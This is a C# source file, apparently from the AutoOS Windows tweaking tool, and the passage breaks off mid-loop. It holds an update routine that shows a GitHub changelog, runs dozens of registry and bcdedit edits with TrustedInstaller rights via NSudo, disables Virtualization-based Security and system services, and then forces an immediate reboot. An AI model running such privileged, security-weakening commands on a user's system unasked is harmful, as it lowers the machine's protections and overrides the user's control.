using AutoOS.Helpers;
using AutoOS.Views.Installer.Actions;
using CommunityToolkit.WinUI.Controls;
using Downloader;
using Microsoft.UI.Text;
using Microsoft.UI.Xaml.Media;
using Microsoft.Win32;
using System.Management;
using System.Net;
using System.Text;
using System.Text.Json;
using Windows.Storage;
using System.Diagnostics;

namespace AutoOS.Views.Settings
{
    public sealed partial class HomeLandingPage : Page
    {
        private readonly ApplicationDataContainer localSettings = ApplicationData.Current.LocalSettings;
        private static readonly HttpClient httpClient = new();
        private readonly TextBlock StatusText = new()
        {
            Margin = new Thickness(0, 12, 0, 0),
            FontSize = 14,
            FontWeight = FontWeights.Medium
        };

        private readonly ProgressBar ProgressBar = new()
        {
            Margin = new Thickness(0, 12, 0, 0)
        };
        public HomeLandingPage()
        {
            InitializeComponent();
			#if !DEBUG
                Loaded += GetChangeLog;
            #endif
		}

        private async void GetChangeLog(object sender, RoutedEventArgs e)
        {
            string storedVersion = localSettings.Values["Version"] as string;
            string currentVersion = ProcessInfoHelper.Version;

            if (storedVersion != currentVersion)
            {
                try
                {
                    httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("AutoOS");

                    using var doc = JsonDocument.Parse(await httpClient.GetStringAsync($"https://api.github.com/repos/tinodin/AutoOS/releases/tags/v{currentVersion}"));

                    if (doc.RootElement.TryGetProperty("body", out var body))
                    {
                        string rawChangelog = body.GetString()!;
                        string changelog = rawChangelog.Replace("`", "")[rawChangelog.IndexOf("- ")..];

                        var contentDialog = new ContentDialog
                        {
                            Title = $"What’s new in AutoOS v{currentVersion}",
                            Content = new ScrollViewer
                            {
                                Content = new MarkdownTextBlock
                                {
                                    Text = changelog,
                                    Config = new MarkdownConfig()
                                },
                                Padding = new Thickness(0, 0, 36, 0)
                            },
                            CloseButtonText = "Close",
                            XamlRoot = XamlRoot
                        };

                        contentDialog.Resources["ContentDialogMaxWidth"] = 1000;
                        await contentDialog.ShowAsync();
                    }
                }
                catch
                {

                }

                await Update();
                StatusText.Text = "Update complete.";
                ProgressBar.Foreground = new SolidColorBrush((Windows.UI.Color)Application.Current.Resources["SystemFillColorSuccess"]);
                localSettings.Values["Version"] = currentVersion;
                await LogDiscordUser();
                StatusText.Text = "Restarting in 3...";
                await Task.Delay(1000);
                StatusText.Text = "Restarting in 2...";
                await Task.Delay(1000);
                StatusText.Text = "Restarting in 1...";
                await Task.Delay(1000);
                StatusText.Text = "Restarting...";
                await Task.Delay(750);

                ProcessStartInfo processStartInfo = new()
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c shutdown /r /t 0",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                Process.Start(processStartInfo);
            }
        }

        private async Task Update()
        {
            var updater = new ContentDialog
            {
                Title = "Updating AutoOS",
                Content = new StackPanel
                {
                    Children =
                    {
                        StatusText,
                        ProgressBar
                    }
                },
                PrimaryButtonText = "Done",
                IsPrimaryButtonEnabled = false,
                Resources = new ResourceDictionary
                {
                    ["ContentDialogMinWidth"] = 500,
                    ["ContentDialogMaxWidth"] = 1000
                },
                XamlRoot = XamlRoot
            };

            _ = updater.ShowAsync();

            string previousTitle = string.Empty;

            bool Steam = File.Exists(SteamHelper.SteamPath);
            bool servicesState = (int)(Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Beep")?.GetValue("Start", 0) ?? 0) == 1;
            string list = Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "lists.ini");
            string nsudoPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Assets", "Applications", "NSudo", "NSudoLC.exe");

            using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");

            string buildStr = key.GetValue("CurrentBuild")?.ToString() ?? "";
            string ubrStr = key.GetValue("UBR")?.ToString() ?? "";
            if (int.TryParse(buildStr, out int build) && int.TryParse(ubrStr, out int ubr))
            {
                if (build != 26200 && !servicesState)
                {
                    var dialog = new ContentDialog
                    {
                        Title = "AutoOS now requires 25H2",
                        Content = $"AutoOS is now only supported on Windows 11 25H2. \nPlease follow the Getting Started guide in the README on GitHub to reinstall AutoOS.",
                        CloseButtonText = "OK",
                        DefaultButton = ContentDialogButton.Close,
                        XamlRoot = App.MainWindow.Content.XamlRoot
                    };
                    dialog.Resources["ContentDialogMaxWidth"] = 800;
                    await dialog.ShowAsync();
                    Application.Current.Exit();
                }
            }

            var actions = new List<(string Title, Func<Task> Action, Func<bool> Condition)>
            {
                // process explorer
                ("Installing Process Explorer", async () => await Task.Run(() => Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Process Explorer"))), () => build == 26200),
				("Installing Process Explorer", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"" /v Debugger /f"), () => build == 26200),
				("Installing Process Explorer", async () => await Task.Run(() => File.Copy(@"C:\Windows\procexp64.exe", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Process Explorer", "procexp64.exe"), true)), () => build == 26200),
			    ("Installing Process Explorer", async () => await ProcessActions.RunPowerShell(@"$Shell = New-Object -ComObject WScript.Shell; $Shortcut = $Shell.CreateShortcut([System.IO.Path]::Combine($env:ProgramData, 'Microsoft\Windows\Start Menu\Programs\Process Explorer.lnk')); $Shortcut.TargetPath = [System.IO.Path]::Combine($env:ProgramFiles, 'Process Explorer\procexp64.exe'); $Shortcut.Save()"), () => build == 26200),
			    ("Installing Process Explorer", async () => await ProcessActions.RunNsudo("CurrentUser", $"cmd /c reg import \"{Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Assets", "Scripts", "processexplorer.reg")}\""), () => build == 26200),
			    ("Installing Process Explorer", async () => await ProcessActions.Sleep(500), () => build == 26200),

                // enable steam client service
			    ("Enabling Steam Client Service", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Steam Client Service"" /v ""Start"" /t REG_DWORD /d 3 /f"), () => Steam == true && build == 26200),

                // revert native nvme
                ("Reverting Native NVME", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Policies\Microsoft\FeatureManagement\Overrides"" /v 735209102 /f"), () => build == 26200),
                ("Reverting Native NVME", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Policies\Microsoft\FeatureManagement\Overrides"" /v 1853569164 /f"), () => build == 26200),
                ("Reverting Native NVME", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Policies\Microsoft\FeatureManagement\Overrides"" /v 156965516 /f"), () => build == 26200),
                
                // remove unneeded registry keys
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications"" /v NoCloudApplicationNotification /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState"" /v ExcludeWUDrivers /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching"" /v DontPromptForWindowsUpdate /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching"" /v SearchOrderConfig /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata"" /v PreventDeviceMetadataFromNetwork /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\PushToInstall"" /v DisablePushToInstall /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v AllowCortana /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v AllowCortanaAboveLock /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v AllowCortanaInAAD /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v AllowCortanaInAADPathOOBE /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v AllowCloudSearch /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v ConnectedSearchUseWebOverMeteredConnections /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v DisableWebSearch /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v ConnectedSearchSafeSearch /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v AllowSearchToUseLocation /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Speech_OneCore\Preferences"" /v ModelDownloadAllowed /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Speech_OneCore\Preferences"" /v VoiceActivationEnableAboveLockscreen /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds"" /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CloudContent"" /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v SubscribedContent-310093Enabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v ContentDeliveryAllowed /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v FeatureManagementEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v OEMPreInstalledAppsEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v PreInstalledAppsEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v PreInstalledAppsEverEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v SilentInstalledAppsEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v SoftLandingEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v SubscribedContentEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v SubscribedContent-338387Enabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v SubscribedContent-338388Enabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v SubscribedContent-353698Enabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"" /v SystemPaneSuggestionsEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\DriverSearching"" /v DontPromptForWindowsUpdate /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v AllowCortana /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v AllowCortanaAboveLock /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v AllowCortanaInAAD /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v AllowCortanaInAADPathOOBE /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v AllowCloudSearch /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v EnableDynamicContentInWSB /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v ConnectedSearchUseWeb /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v ConnectedSearchPrivacy /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v ConnectedSearchUseWebOverMeteredConnections /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v DisableWebSearch /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v ConnectedSearchSafeSearch /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search"" /v AllowSearchToUseLocation /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\CloudContent"" /v ConfigureWindowsSpotlight /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\CloudContent"" /v IncludeEnterpriseSpotlight /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\CloudContent"" /v DisableThirdPartySuggestions /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\CloudContent"" /v DisableTailoredExperiencesWithDiagnosticData /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\CloudContent"" /v DisableWindowsSpotlightWindowsWelcomeExperience /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\CloudContent"" /v DisableWindowsSpotlightOnActionCenter /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\CloudContent"" /v DisableWindowsSpotlightOnSettings /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v ShowCortanaButton /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v ShowCopilotButton /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v TaskbarMn /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Explorer"" /v DisableSearchBoxSuggestions /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Speech_OneCore\Preferences"" /v ModelDownloadAllowed /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Speech_OneCore\Preferences"" /v VoiceActivationEnableAboveLockscreen /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\SearchSettings"" /v IsDeviceSearchHistoryEnabled /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Windows Feeds"" /v EnableFeeds /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Explorer"" /v DisableGraphRecentItems /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("LocalMachine", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v EnableDynamicContentInWSB /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("LocalMachine", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v ConnectedSearchUseWeb /f"), () => build == 26200),
                ("Removing unneeded registry keys", async () => await ProcessActions.RunNsudo("LocalMachine", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search"" /v ConnectedSearchPrivacy /f"), () => build == 26200),

                // revert notification settings
                (@"Enabling ""Allow notifications to play sounds""", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings"" /v NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND /f"), () => build == 26200),
                (@"Enabling ""Show notifications on the lock screen""", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings"" /v NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK /f"), () => build == 26200),
                (@"Enabling ""Show notifications on the lock screen""", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PushNotifications"" /v LockScreenToastEnabled /f"), () => build == 26200),
                (@"Enabling ""Show reminders and incoming VoIP calls on the lock screen""", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings"" /v NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK /f"), () => build == 26200),

                // disable "show websites from your browsing history"
                (@"Disabling ""Show websites from your browsing history""", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Start_RecoPersonalizedSites /t REG_DWORD /d 0 /f"), () => build == 26200),

                // disable "show account-related notifications"
                (@"Disabling ""Show account-related notifications""", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Start_AccountNotifications /t REG_DWORD /d 0 /f"), () => build == 26200),
                
                // enable "Show recommended files in Start, recent files in File Explorer, and items in Jump Lists"
                ("Enabling tracking of recent files", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Start_TrackDocs /t REG_DWORD /d 1 /f"), () => build == 26200),

                // reset "allow storage sense" policy
				(@"Resetting ""Allow Storage Sense"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\StorageSense"" /v AllowStorageSenseGlobal /f"), () => build == 26200),
                
                // reset "configure automatic updates" policy
				(@"Resetting ""Configure Automatic Updates"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /f"), () => build == 26200),

                // reset "allow storage sense" policy
				(@"Resetting ""Allow Storage Sense"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\StorageSense"" /v AllowStorageSenseGlobal /f"), () => build == 26200),
                
                // fix "do not include drivers with windows updates" policy
				(@"Fixing ""Do not include drivers with Windows Updates"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ExcludeWUDriversInQualityUpdate /t REG_DWORD /d 1 /f"), () => build == 26200),

                // enable automatic recovery
                ("Enabling automatic recovery", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"bcdedit /deletevalue recoveryenabled"), () => build == 26200),

                // disable virtualization-based security (VBS)
                ("Disabling Virtualization-based Security (VBS)", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f"), () => build == 26200),

                // enable scroll wheel for alt tab
                (@"Enabling Scroll Wheel for Alt Tab", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg add ""HKEY_CURRENT_USER\SOFTWARE\Ingan121\ClassicWindowSwitcher"" /v ScrollWheelBehavior /t REG_DWORD /d 1 /f"), () => build == 26200),

                // update lists.ini
                ("Updating lists.ini", async () => { File.Copy(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Assets", "Applications", "Service-list-builder", "lists.ini"), list, true); }, () => build == 26200),
                
                // enable services & drivers
                ("Enabling Services & Drivers", async () => await Process.Start(new ProcessStartInfo { FileName = nsudoPath, Arguments = $"-U:T -P:E -Wait -ShowWindowMode:Hide \"{Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "build", Directory.GetDirectories(Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "build")).OrderByDescending(d => Directory.GetLastWriteTime(d)).FirstOrDefault()?.Split('\\').Last(), "Services-Enable.bat")}\"", CreateNoWindow = true }).WaitForExitAsync(), () => servicesState == false && build == 26200),

                // build service list
                ("Building service list", async () => await Process.Start(new ProcessStartInfo { FileName = nsudoPath, Arguments = $@"-U:T -P:E -Wait -ShowWindowMode:Hide ""{Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Assets", "Applications", "Service-list-builder", "service-list-builder.exe")}"" --config ""{Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "lists.ini")}"" --disable-service-warning --output-dir ""{Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "build")}""", CreateNoWindow = true }).WaitForExitAsync(), () => servicesState == false && build == 26200),

                // disable services & drivers
                ("Disabling Services & Drivers", async () => await Process.Start(new ProcessStartInfo { FileName = nsudoPath, Arguments = $"-U:T -P:E -Wait -ShowWindowMode:Hide \"{Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "build", Directory.GetDirectories(Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "build")).OrderByDescending(d => Directory.GetLastWriteTime(d)).FirstOrDefault()?.Split('\\').Last(), "Services-Disable.bat")}\"", CreateNoWindow = true }).WaitForExitAsync(), () => servicesState == false && build == 26200),

                // enable services & drivers
                ("Enabling Services & Drivers", async () => await Process.Start(new ProcessStartInfo { FileName = nsudoPath, Arguments = $"-U:T -P:E -Wait -ShowWindowMode:Hide \"{Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "build", Directory.GetDirectories(Path.Combine(PathHelper.GetAppDataFolderPath(), "Service-list-builder", "build")).OrderByDescending(d => Directory.GetLastWriteTime(d)).FirstOrDefault()?.Split('\\').Last(), "Services-Enable.bat")}\"", CreateNoWindow = true }).WaitForExitAsync(), () => servicesState == false && build != 26200),
            };

            var filteredActions = actions.Where(a => a.Condition == null || a.Condition.Invoke()).ToList();
            int groupedTitleCount = 0;

            List<Func<Task>> currentGroup = [];

            for (int i = 0; i < filteredActions.Count; i++)
            {
                if (i == 0 || filteredActions[i].Title != filteredActions[i - 1].Title)
                {
                    groupedTitleCount++;
                }
            }

            double incrementPerTitle = groupedTitleCount > 0 ? 100 / (double)groupedTitleCount : 0;

            foreach (var (title, action, condition) in filteredActions)
            {
                if (previousTitle != string.Empty && previousTitle != title && currentGroup.Count > 0)
                {
                    foreach (var groupedAction in currentGroup)
                    {
                        try
                        {
                            await groupedAction();
                        }
                        catch (Exception ex)
                        {
                            StatusText.Text = ex.Message;
                            ProgressBar.Foreground = (Brush)Application.Current.Resources["SystemFillColorCriticalBrush"];
                        }
                    }

                    ProgressBar.Value += incrementPerTitle;
                    await Task.Delay(250);
                    currentGroup.Clear();
